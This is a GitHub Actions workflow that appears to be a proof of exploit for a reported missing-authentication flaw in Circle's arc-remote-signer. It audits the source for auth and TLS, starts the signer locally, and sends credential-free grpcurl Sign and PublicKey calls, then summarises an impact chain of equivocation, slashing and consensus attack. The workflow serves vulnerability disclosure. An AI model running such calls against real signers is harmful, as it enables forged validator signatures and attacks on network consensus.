name: Circle arc-remote-signer Unauthenticated Sign PoE

on:
  workflow_dispatch:

jobs:
  poe:
    runs-on: ubuntu-latest
    timeout-minutes: 20

    steps:
      - name: Install Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.22'

      - name: Clone arc-remote-signer
        run: |
          git clone https://github.com/circlefin/arc-remote-signer.git
          cd arc-remote-signer
          echo "Commit: $(git rev-parse HEAD)"
          echo "Cloned at: $(date -u)"

      - name: Audit - confirm NO auth interceptor exists
        run: |
          cd arc-remote-signer
          echo "=== interceptor/ directory - all files ==="
          ls internal/common/grpc/server/interceptor/
          echo ""
          echo "=== Searching for auth/token/jwt in interceptor files ==="
          grep -rl "auth\|token\|jwt\|bearer\|credential\|authenticate\|authorize" \
            internal/common/grpc/server/interceptor/ 2>/dev/null \
            && echo "AUTH FOUND" || echo "NO AUTH INTERCEPTOR - CONFIRMED"
          echo ""
          echo "=== server.go - interceptors registered ==="
          grep -A 20 "func NewServer" internal/common/grpc/server/server.go

      - name: Audit - Sign handler has no auth check
        run: |
          cd arc-remote-signer
          echo "=== Sign() handler source ==="
          grep -n "func\|auth\|token\|jwt\|credential\|Unauthenticated\|codes.Permission" \
            internal/app/service/signer/signer.go
          echo ""
          echo "=== SignRequest proto - only field is message bytes ==="
          cat proto/arc/signer/v1/signer.proto
          echo ""
          echo "=== public.go - no TLS in server setup ==="
          grep -n "TLS\|tls\|Cred\|cred\|cert\|ListenerTransport" \
            internal/app/public/public.go

      - name: Install grpcurl
        run: |
          curl -sSL \
            https://github.com/fullstorydev/grpcurl/releases/download/v1.9.1/grpcurl_1.9.1_linux_amd64.tar.gz \
            | tar -xz
          chmod +x grpcurl
          sudo mv grpcurl /usr/local/bin/
          grpcurl --version

      - name: Build arc-remote-signer proxy binary
        run: |
          cd arc-remote-signer
          echo "=== Building proxy binary ==="
          go build -o /tmp/arc-signer ./cmd/proxy/... 2>&1 \
            && echo "Build SUCCESS" || echo "Build result above"
          ls /tmp/arc-signer 2>/dev/null && echo "Binary present" || echo "No binary"

      - name: Start service and call Sign without credentials
        run: |
          cd arc-remote-signer

          # Write minimal config - starts gRPC server, no enclave loaded
          cat > /tmp/arc-signer-config.yml << 'CFGEOF'
          name: arc-remote-signer-poe
          env: dev
          public:
            server:
              host: "0.0.0.0"
              port: 10340
          CFGEOF

          # Start signer in background
          /tmp/arc-signer --config /tmp/arc-signer-config.yml 2>&1 &
          SIGNER_PID=$!
          sleep 4
          echo "Signer PID: $SIGNER_PID"

          echo ""
          echo "=== CALL 1: PublicKey() - no credentials ==="
          grpcurl -plaintext localhost:10340 arc.signer.v1.SignerService/PublicKey \
            2>&1 || true

          echo ""
          echo "=== CALL 2: Sign() arbitrary bytes - no credentials ==="
          grpcurl -plaintext -d '{"message":"AAEC"}' \
            localhost:10340 arc.signer.v1.SignerService/Sign \
            2>&1 || true

          echo ""
          echo "KEY OBSERVATION:"
          echo "codes.Internal (service not initialized) = auth ABSENT, server accepted call"
          echo "codes.Unauthenticated = auth present, server rejected call"
          echo "In production with loaded key: same call returns valid signature"

          kill $SIGNER_PID 2>/dev/null || true

      - name: Smoke test confirms unauthenticated connection
        run: |
          cd arc-remote-signer
          echo "=== Official smoke test connects to port 10340 with no credentials ==="
          grep -n "defaultSvcAddr\|localhost\|10340\|credential\|auth\|token" \
            internal/smoke/provider/proxy/proxy.go

      - name: Summary
        run: |
          echo "================================================================"
          echo "arc-remote-signer UNAUTHENTICATED SIGNING ORACLE - CONFIRMED"
          echo "================================================================"
          echo ""
          echo "1. proto/arc/signer/v1/signer.proto:"
          echo "   SignRequest { bytes message = 1; }  <- no auth field"
          echo ""
          echo "2. internal/common/grpc/server/interceptor/:"
          echo "   logging, metric, middleware, recovery, request_id"
          echo "   <- NO auth interceptor"
          echo ""
          echo "3. internal/app/service/signer/signer.go Sign():"
          echo "   validates req != nil and len(message) > 0"
          echo "   <- NO caller authentication"
          echo ""
          echo "4. internal/app/public/public.go:"
          echo "   ListenerTransportTCP (plain TCP, no TLS)"
          echo "   <- NO transport security"
          echo ""
          echo "5. internal/smoke/provider/proxy/proxy.go:"
          echo "   connects to localhost:10340 with no credentials"
          echo "   <- Official smoke tests confirm no auth expected"
          echo ""
          echo "Impact: any network-reachable caller obtains validator signatures"
          echo "for arbitrary bytes -> equivocation -> slashing -> consensus attack"
